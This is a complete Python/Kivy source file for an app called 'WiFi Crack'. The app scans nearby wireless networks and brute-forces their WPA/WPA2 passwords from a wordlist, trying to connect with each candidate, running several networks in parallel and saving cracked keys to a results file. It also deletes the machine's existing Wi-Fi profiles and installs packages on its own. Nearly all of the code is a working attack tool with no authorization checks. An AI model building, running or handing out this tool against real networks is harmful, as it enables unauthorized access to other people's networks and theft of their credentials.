import os
import platform
import sys
import time
import json
from datetime import datetime
from threading import Thread
from typing import List
from functools import partial
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.checkbox import CheckBox
from kivy.uix.progressbar import ProgressBar
from kivy.uix.popup import Popup
from kivy.uix.filechooser import FileChooserIconView
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.properties import StringProperty, BooleanProperty, NumericProperty
from kivy.utils import get_color_from_hex
from kivy.animation import Animation

try:
    import pywifi
    from pywifi import const
    PYWIFI_AVAILABLE = True
except ImportError:
    PYWIFI_AVAILABLE = False

if platform.system() == "Windows":
    try:
        import comtypes
    except ImportError:
        pass

DEFAULT_WORDLIST = "passwords.txt"
RESULTS_DIR = "results"
TIMEOUT_SECONDS = 15
os.makedirs(RESULTS_DIR, exist_ok=True)

class Colors:
    RED = "#FF5252"
    GREEN = "#4CAF50"
    YELLOW = "#FFEB3B"
    CYAN = "#00BCD4"
    BLUE = "#2196F3"
    GRAY = "#9E9E9E"
    WHITE = "#FFFFFF"
    BLACK = "#000000"

class WiFiScanner:
    def __init__(self, interface_index=0, status_callback=None):
        self.status_callback = status_callback
        self.wifi = None
        self.interface = None
        self.successful_attempts = {}
        self.attempted_passwords = set()
        self.running = True
        self.scan_results = []
        self.android_wifi = False
        if "ANDROID_ARGUMENT" in os.environ:
            self.initialize_android_wifi()
        else:
            self.initialize_standard_wifi(interface_index)
    def initialize_android_wifi(self):
        try:
            from jnius import autoclass, cast
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            self.wifi_manager = cast('android.net.wifi.WifiManager', PythonActivity.mActivity.getSystemService(Context.WIFI_SERVICE))
            if not self.wifi_manager.isWifiEnabled():
                self.wifi_manager.setWifiEnabled(True)
            self.android_wifi = True
            self.load_previous_attempts()
            self.log("Android WiFi initialized successfully.")
        except Exception as e:
            self.log("Error initializing Android WiFi: " + str(e))
            self.android_wifi = False
    def initialize_standard_wifi(self, interface_index):
        if platform.system() == "Linux" and not os.path.exists("/var/run/wpa_supplicant"):
            self.log("wpa_supplicant not found. Ensure it is installed and running.")
            return
        if not PYWIFI_AVAILABLE:
            self.log("pywifi not installed. Installing...")
            self.install_pywifi()
            return
        try:
            self.wifi = pywifi.PyWiFi()
            interfaces = self.wifi.interfaces()
            if not interfaces:
                self.log("No wireless interfaces found!")
                return
            self.log(f"Available wireless interfaces: {len(interfaces)}")
            for i, interface in enumerate(interfaces):
                self.log(f"{i}: {interface.name()}")
            try:
                self.interface = interfaces[interface_index]
                self.log(f"Using interface: {self.interface.name()}")
            except IndexError:
                self.log(f"Interface index {interface_index} out of range. Using default interface (0).")
                self.interface = interfaces[0]
            self.load_previous_attempts()
        except Exception as e:
            self.log("Error initializing WiFi: " + str(e))
    def install_pywifi(self):
        try:
            import subprocess
            self.log("Installing required dependencies...")
            process = subprocess.Popen([sys.executable, "-m", "pip", "install", "pywifi"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode != 0:
                self.log("Failed to install pywifi: " + stderr.decode())
                return False
            if platform.system() == "Windows":
                process = subprocess.Popen([sys.executable, "-m", "pip", "install", "comtypes"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                process.communicate()
            self.log("Dependencies installed. Please restart the application.")
            return True
        except Exception as e:
            self.log("Error installing dependencies: " + str(e))
            return False
    def log(self, message):
        if self.status_callback:
            self.status_callback(message)
        print(message)
    def load_previous_attempts(self):
        success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
        if os.path.exists(success_file):
            try:
                with open(success_file, 'r') as f:
                    self.successful_attempts = json.load(f)
                self.log(f"Loaded {len(self.successful_attempts)} previously cracked networks")
            except Exception:
                self.log("Could not read previous successful attempts")
        attempts_file = os.path.join(RESULTS_DIR, "attempted_combinations.txt")
        if os.path.exists(attempts_file):
            try:
                with open(attempts_file, 'r') as f:
                    for line in f:
                        if '--' in line:
                            network, password = line.strip().split('--', 1)
                            self.attempted_passwords.add(f"{network}--{password}")
                self.log(f"Loaded {len(self.attempted_passwords)} previously attempted combinations")
            except Exception:
                self.log("Could not read previous attempt log")
    def save_successful_attempt(self, network, password):
        self.successful_attempts[network] = {"password": password, "timestamp": datetime.now().isoformat()}
        success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
        try:
            with open(success_file, 'w') as f:
                json.dump(self.successful_attempts, f, indent=2)
        except Exception:
            self.log("Could not save successful attempt")
    def log_attempt(self, network, password):
        attempt_key = f"{network}--{password}"
        self.attempted_passwords.add(attempt_key)
        attempts_file = os.path.join(RESULTS_DIR, "attempted_combinations.txt")
        try:
            with open(attempts_file, 'a') as f:
                f.write(f"{attempt_key}\n")
        except Exception:
            pass
    def scan_networks(self):
        if self.android_wifi:
            return self.scan_android_wifi()
        if not self.interface:
            self.log("No wireless interface available")
            return []
        self.log("Scanning for Wi-Fi networks...")
        try:
            if self.interface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                self.log("Activating interface...")
                if platform.system() == "Windows":
                    try:
                        self.interface.disconnect()
                        time.sleep(1)
                    except Exception:
                        pass
            self.interface.scan()
            scan_wait_time = 4 if platform.system() == "Windows" else 2
            self.log(f"Waiting {scan_wait_time} seconds for scan to complete...")
            time.sleep(scan_wait_time)
            seen_ssids = set()
            unique_networks = []
            try:
                all_results = self.interface.scan_results()
                if not all_results:
                    self.log("No networks found in scan.")
                    return []
                all_results.sort(key=lambda x: getattr(x, 'signal', 0), reverse=True)
                for network in all_results:
                    if hasattr(network, 'ssid') and network.ssid and network.ssid.strip():
                        if network.ssid not in seen_ssids:
                            seen_ssids.add(network.ssid)
                            unique_networks.append(network)
                    elif hasattr(network, 'bssid') and network.bssid:
                        if network.bssid not in seen_ssids:
                            seen_ssids.add(network.bssid)
                            network.ssid = f"<Hidden Network: {network.bssid}>"
                            unique_networks.append(network)
            except Exception as e:
                self.log("Error getting scan results: " + str(e))
                return []
            self.scan_results = unique_networks
            return unique_networks
        except Exception as e:
            self.log("Error during network scan: " + str(e))
            return []
    def scan_android_wifi(self):
        try:
            self.wifi_manager.startScan()
            time.sleep(4)
            results = self.wifi_manager.getScanResults()
            self.log(f"Android scan results: {results}")
            networks = []
            for result in results.toArray():
                ssid = result.SSID
                bssid = result.BSSID
                level = result.level
                net = type('Network', (), {})()
                net.ssid = ssid if ssid and ssid.strip() != "" else f"<Hidden Network: {bssid}>"
                net.signal = level
                networks.append(net)
            self.log(f"Found {len(networks)} networks on Android")
            return networks
        except Exception as e:
            self.log("Error scanning Android WiFi: " + str(e))
            return []
    def test_password(self, network, password, timeout=TIMEOUT_SECONDS):
        if self.android_wifi:
            self.log("Password testing is not supported on Android.")
            return False
        attempt_key = f"{network.ssid}--{password}"
        if attempt_key in self.attempted_passwords:
            return False
        self.log_attempt(network.ssid, password)
        try:
            profile = pywifi.Profile()
            profile.ssid = network.ssid
            profile.akm = []
            auth_types = [const.AUTH_ALG_OPEN]
            if hasattr(network, 'akm') and network.akm:
                akm_types = network.akm
            else:
                akm_types = [const.AKM_TYPE_WPA2PSK]
                if platform.system() != "Windows":
                    akm_types.extend([const.AKM_TYPE_WPAPSK, const.AKM_TYPE_WPA2PSK])
            profile.auth = auth_types[0]
            for akm_type in akm_types:
                profile.akm.append(akm_type)
            if const.AKM_TYPE_WPA2PSK in akm_types:
                profile.cipher = const.CIPHER_TYPE_CCMP
            else:
                profile.cipher = const.CIPHER_TYPE_TKIP
            profile.key = password
            try:
                self.interface.remove_all_network_profiles()
            except Exception as e:
                self.log("Warning: Could not remove profiles: " + str(e))
            try:
                temp_profile = self.interface.add_network_profile(profile)
            except Exception as e:
                if "You must specify profile attributes" in str(e):
                    self.log("Retrying with alternate profile configuration...")
                    profile = pywifi.Profile()
                    profile.ssid = network.ssid
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm = [const.AKM_TYPE_WPA2PSK]
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = password
                    try:
                        temp_profile = self.interface.add_network_profile(profile)
                    except Exception as inner_e:
                        self.log("Error creating profile: " + str(inner_e))
                        return False
                else:
                    self.log("Error adding profile: " + str(e))
                    return False
            try:
                self.interface.connect(temp_profile)
            except Exception as e:
                self.log("Error connecting: " + str(e))
                return False
            start_time = time.time()
            connection_successful = False
            while time.time() - start_time < timeout:
                try:
                    status = self.interface.status()
                    if status == const.IFACE_CONNECTED:
                        connection_successful = True
                        break
                    elif status == const.IFACE_DISCONNECTED:
                        break
                except Exception as e:
                    self.log("Error checking status: " + str(e))
                    break
                time.sleep(0.5)
            try:
                self.interface.disconnect()
            except Exception as e:
                self.log("Error disconnecting: " + str(e))
            if connection_successful:
                self.log("Successfully connected with password: " + password)
                time.sleep(1)
            return connection_successful
        except Exception as e:
            self.log("Error during password attempt: " + str(e))
            try:
                self.interface.disconnect()
            except Exception:
                pass
            return False
    def crack_network(self, network, passwords, progress_callback=None):
        if self.android_wifi:
            self.log("Cracking is not supported on Android.")
            return False, None
        if network.ssid in self.successful_attempts:
            self.log("Network " + network.ssid + " already cracked: " + self.successful_attempts[network.ssid]['password'])
            return True, self.successful_attempts[network.ssid]['password']
        total_passwords = len(passwords)
        for i, password in enumerate(passwords):
            if progress_callback:
                progress_callback(i + 1, total_passwords, password)
            if len(password) < 8 or not all(32 <= ord(ch) < 127 for ch in password):
                continue
            self.log("Trying " + network.ssid + " with password: " + password + " (" + str(i + 1) + "/" + str(total_passwords) + ")")
            time.sleep(1)
            if self.test_password(network, password):
                self.log("PASSWORD FOUND for " + network.ssid + ": " + password)
                self.save_successful_attempt(network.ssid, password)
                return True, password
            if not self.running:
                return False, None
        return False, None

class NetworkItem(BoxLayout):
    ssid = StringProperty("")
    status = StringProperty("")
    signal = StringProperty("")
    selected = BooleanProperty(False)
    def __init__(self, network, **kwargs):
        super(NetworkItem, self).__init__(**kwargs)
        self.orientation = 'horizontal'
        self.size_hint_y = None
        self.height = 50
        self.padding = 10
        self.spacing = 10
        self.opacity = 0
        self.network = network
        self.ssid = network.ssid
        self.signal = f"{getattr(network, 'signal', 0)} dBm" if hasattr(network, 'signal') else "N/A"
        self.checkbox = CheckBox(active=False, size_hint_x=None, width=30)
        self.checkbox.bind(active=self.on_checkbox_active)
        self.add_widget(self.checkbox)
        ssid_label = Label(text=self.ssid, halign='left', valign='middle', size_hint_x=0.6, font_size='18sp')
        ssid_label.bind(size=ssid_label.setter('text_size'))
        self.add_widget(ssid_label)
        signal_label = Label(text=self.signal, halign='center', valign='middle', size_hint_x=0.2, font_size='16sp')
        self.add_widget(signal_label)
        self.status_label = Label(text="", halign='right', valign='middle', size_hint_x=0.2, font_size='16sp')
        self.add_widget(self.status_label)
        Animation(opacity=1, duration=0.5).start(self)
    def on_checkbox_active(self, checkbox, value):
        self.selected = value
    def set_status(self, status, success=False, in_progress=False):
        self.status = status
        self.status_label.text = status
        if success:
            self.status_label.color = get_color_from_hex(Colors.GREEN)
        elif in_progress:
            self.status_label.color = get_color_from_hex(Colors.YELLOW)
        else:
            self.status_label.color = get_color_from_hex(Colors.GRAY)

class CrackingTask(BoxLayout):
    ssid = StringProperty("")
    progress = NumericProperty(0)
    current_password = StringProperty("")
    status = StringProperty("Waiting...")
    def __init__(self, network, **kwargs):
        super(CrackingTask, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.size_hint_y = None
        self.height = 120
        self.padding = 10
        self.spacing = 5
        self.network = network
        self.ssid = network.ssid
        header = BoxLayout(orientation='horizontal', size_hint_y=None, height=30)
        ssid_label = Label(text=self.ssid, halign='left', valign='middle', size_hint_x=0.7, font_size='20sp', color=get_color_from_hex(Colors.CYAN))
        ssid_label.bind(size=ssid_label.setter('text_size'))
        header.add_widget(ssid_label)
        self.status_label = Label(text=self.status, halign='right', valign='middle', size_hint_x=0.3, font_size='18sp', color=get_color_from_hex(Colors.YELLOW))
        self.status_label.bind(size=self.status_label.setter('text_size'))
        header.add_widget(self.status_label)
        self.add_widget(header)
        self.password_label = Label(text="", halign='left', valign='middle', font_size='16sp', color=get_color_from_hex(Colors.GRAY))
        self.password_label.bind(size=self.password_label.setter('text_size'))
        self.add_widget(self.password_label)
        self.progress_bar = ProgressBar(max=100, value=0)
        self.add_widget(self.progress_bar)
    def update_progress(self, current, total, password):
        self.progress = (current / total) * 100 if total > 0 else 0
        self.progress_bar.value = self.progress
        self.current_password = password
        self.password_label.text = f"Testing: {password}"
    def set_status(self, status, success=False, failure=False):
        self.status = status
        self.status_label.text = status
        if success:
            self.status_label.color = get_color_from_hex(Colors.GREEN)
        elif failure:
            self.status_label.color = get_color_from_hex(Colors.RED)
        else:
            self.status_label.color = get_color_from_hex(Colors.YELLOW)

class WiFiCrackApp(App):
    def __init__(self, **kwargs):
        super(WiFiCrackApp, self).__init__(**kwargs)
        self.title = 'WiFi Crack'
        self.scanner = None
        self.networks = []
        self.passwords = []
        self.network_items = []
        self.cracking_tasks = {}
        self.cracking_thread = None
        self.is_scanning = False
        self.is_cracking = False
    def build(self):
        self.request_android_permissions()
        self.root = BoxLayout(orientation='vertical', padding=20, spacing=20)
        header = BoxLayout(orientation='horizontal', size_hint_y=None, height=60)
        title = Label(text='WiFi Crack', color=get_color_from_hex(Colors.CYAN), font_size='32sp', size_hint_x=0.7)
        header.add_widget(title)
        self.status_label = Label(text='Ready', color=get_color_from_hex(Colors.GREEN), font_size='20sp', size_hint_x=0.3)
        header.add_widget(self.status_label)
        self.root.add_widget(header)
        log_box = BoxLayout(orientation='vertical', size_hint_y=0.3)
        log_box.add_widget(Label(text='Log Output', size_hint_y=None, height=30, halign='left', font_size='18sp', color=get_color_from_hex(Colors.BLUE)))
        self.log_scroll = ScrollView(bar_width=10)
        self.log_output = Label(text='', halign='left', valign='top', size_hint_y=None, padding=(10, 10), font_size='16sp')
        self.log_output.bind(size=self.on_log_size)
        self.log_scroll.add_widget(self.log_output)
        log_box.add_widget(self.log_scroll)
        self.root.add_widget(log_box)
        networks_box = BoxLayout(orientation='vertical', size_hint_y=0.4)
        networks_header = BoxLayout(orientation='horizontal', size_hint_y=None, height=30)
        networks_header.add_widget(Label(text='Available Networks', halign='left', font_size='20sp', color=get_color_from_hex(Colors.BLUE), size_hint_x=0.7))
        self.scan_button = Button(text='Scan', size_hint_x=0.3, background_color=get_color_from_hex(Colors.BLUE), font_size='20sp')
        self.scan_button.bind(on_release=self.on_scan_pressed)
        networks_header.add_widget(self.scan_button)
        networks_box.add_widget(networks_header)
        self.networks_scroll = ScrollView(bar_width=10)
        self.networks_grid = GridLayout(cols=1, spacing=4, size_hint_y=None)
        self.networks_grid.bind(minimum_height=self.networks_grid.setter('height'))
        self.networks_scroll.add_widget(self.networks_grid)
        networks_box.add_widget(self.networks_scroll)
        self.root.add_widget(networks_box)
        wordlist_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=50, spacing=10)
        wordlist_box.add_widget(Label(text='Wordlist:', size_hint_x=0.3, font_size='20sp'))
        self.wordlist_input = TextInput(text=DEFAULT_WORDLIST, multiline=False, size_hint_x=0.4, font_size='18sp')
        wordlist_box.add_widget(self.wordlist_input)
        upload_btn = Button(text='Upload', size_hint_x=0.3, background_color=get_color_from_hex(Colors.CYAN), font_size='18sp')
        upload_btn.bind(on_release=self.open_file_chooser)
        wordlist_box.add_widget(upload_btn)
        self.root.add_widget(wordlist_box)
        button_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=60, spacing=20)
        self.crack_button = Button(text='Start Cracking', disabled=(True if "ANDROID_ARGUMENT" in os.environ else False), background_color=get_color_from_hex(Colors.GREEN), font_size='20sp')
        self.crack_button.bind(on_release=self.on_crack_pressed)
        button_box.add_widget(self.crack_button)
        self.stop_button = Button(text='Stop', disabled=True, background_color=get_color_from_hex(Colors.RED), font_size='20sp')
        self.stop_button.bind(on_release=self.on_stop_pressed)
        button_box.add_widget(self.stop_button)
        self.root.add_widget(button_box)
        self.scanner = WiFiScanner(status_callback=self.log)
        self.log("WiFi Crack started. Click 'Scan' to search for networks.")
        return self.root
    def request_android_permissions(self):
        if "ANDROID_ARGUMENT" in os.environ:
            try:
                from android.permissions import request_permissions, Permission
                permissions = [
                    Permission.ACCESS_WIFI_STATE,
                    Permission.CHANGE_WIFI_STATE,
                    Permission.ACCESS_FINE_LOCATION,
                    Permission.ACCESS_NETWORK_STATE,
                    Permission.INTERNET,
                    Permission.WRITE_EXTERNAL_STORAGE,
                    Permission.READ_EXTERNAL_STORAGE
                ]
                request_permissions(permissions)
                self.log("Android permissions requested")
            except Exception as e:
                self.log("Error requesting permissions: " + str(e))
                self.show_error_popup("Permission Error", "Could not request necessary permissions. Some features may not work.")
    def open_file_chooser(self, instance):
        content = FileChooserIconView()
        popup = Popup(title="Select Wordlist File", content=content, size_hint=(0.9, 0.9))
        content.bind(on_submit=lambda chooser, selection, touch: self.file_chosen(selection, popup))
        popup.open()
    def file_chosen(self, selection, popup):
        if selection:
            self.wordlist_input.text = selection[0]
            self.log("Selected wordlist: " + selection[0])
        popup.dismiss()
    def on_log_size(self, instance, value):
        instance.text_size = (value[0], None)
        instance.height = max(instance.texture_size[1], 200)
    def log(self, message):
        def update_log(dt):
            self.log_output.text += "\n[" + datetime.now().strftime('%H:%M:%S') + "] " + message
            self.log_scroll.scroll_y = 0
        Clock.schedule_once(update_log, 0)
    def on_scan_pressed(self, instance):
        if self.is_scanning:
            return
        if not PYWIFI_AVAILABLE and not ("ANDROID_ARGUMENT" in os.environ):
            self.show_error_popup("PyWiFi not available", "Required dependencies not installed. Restart after installation.")
            return
        if not self.scanner or (not self.scanner.interface and not self.scanner.android_wifi):
            self.show_error_popup("No WiFi Interface", "No wireless interface found. Ensure WiFi is enabled.")
            return
        self.is_scanning = True
        self.scan_button.disabled = True
        self.status_label.text = "Scanning..."
        self.log("Starting network scan...")
        self.networks_grid.clear_widgets()
        self.network_items = []
        Thread(target=self.perform_scan).start()
    def perform_scan(self):
        networks = self.scanner.scan_networks()
        Clock.schedule_once(lambda dt: self.update_network_list(networks), 0)
    def update_network_list(self, networks):
        self.networks = networks
        self.networks_grid.clear_widgets()
        self.network_items = []
        if not networks:
            self.log("No networks found.")
            self.status_label.text = "No networks found"
        else:
            self.log("Found " + str(len(networks)) + " networks.")
            self.status_label.text = "Found " + str(len(networks)) + " networks"
            for network in networks:
                network_item = NetworkItem(network)
                if network.ssid in self.scanner.successful_attempts:
                    password = self.scanner.successful_attempts[network.ssid]['password']
                    network_item.set_status("Cracked: " + password, True)
                self.networks_grid.add_widget(network_item)
                self.network_items.append(network_item)
            if "ANDROID_ARGUMENT" not in os.environ:
                self.crack_button.disabled = False
        self.is_scanning = False
        self.scan_button.disabled = False
    def load_passwords(self):
        wordlist_path = self.wordlist_input.text
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            self.log("Loaded " + str(len(passwords)) + " passwords from " + wordlist_path)
            return passwords
        except FileNotFoundError:
            self.show_error_popup("File Not Found", "Wordlist file '" + wordlist_path + "' not found")
            return []
        except IOError:
            self.show_error_popup("File Error", "Error reading wordlist file '" + wordlist_path + "'")
            return []
    def on_crack_pressed(self, instance):
        selected_networks = [item for item in self.network_items if item.selected]
        if not selected_networks:
            self.show_error_popup("No Network Selected", "Select at least one network to crack.")
            return
        self.passwords = self.load_passwords()
        if not self.passwords:
            return
        self.is_cracking = True
        self.crack_button.disabled = True
        self.stop_button.disabled = False
        for item in selected_networks:
            Thread(target=self.crack_network_thread, args=(item.network,)).start()
    def crack_network_thread(self, network):
        progress_callback = lambda current, total, pwd: Clock.schedule_once(lambda dt: self.update_cracking_progress(network, current, total, pwd), 0)
        result, found_password = self.scanner.crack_network(network, self.passwords, progress_callback)
        if result:
            Clock.schedule_once(lambda dt: self.update_network_item_success(network, found_password), 0)
        else:
            Clock.schedule_once(lambda dt: self.update_network_item_failure(network), 0)
    def update_cracking_progress(self, network, current, total, password):
        for item in self.network_items:
            if item.network.ssid == network.ssid:
                item.set_status(f"Testing: {password} ({current}/{total})", in_progress=True)
    def update_network_item_success(self, network, password):
        for item in self.network_items:
            if item.network.ssid == network.ssid:
                item.set_status("Cracked: " + password, success=True)
    def update_network_item_failure(self, network):
        for item in self.network_items:
            if item.network.ssid == network.ssid:
                item.set_status("Failed", success=False)
    def on_stop_pressed(self, instance):
        self.is_cracking = False
        if self.scanner:
            self.scanner.running = False
        self.crack_button.disabled = False
        self.stop_button.disabled = True
        self.log("Cracking stopped by user.")
    def show_error_popup(self, title, message):
        popup = Popup(title=title, content=Label(text=message, font_size='18sp'), size_hint=(None, None), size=(400, 200))
        popup.open()

if __name__ == '__main__':
    WiFiCrackApp().run()